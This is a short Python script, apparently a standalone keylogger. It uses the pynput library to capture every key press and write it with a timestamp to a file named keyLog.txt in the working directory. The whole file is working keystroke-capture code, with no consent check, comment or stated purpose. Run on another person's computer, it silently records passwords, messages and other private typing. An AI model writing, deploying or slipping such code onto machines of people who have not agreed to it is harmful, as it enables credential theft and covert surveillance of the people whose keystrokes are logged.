import logging
from pynput.keyboard import Listener
import os

log_dir = os.getcwd()
logging.basicConfig(filename=(log_dir + "/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()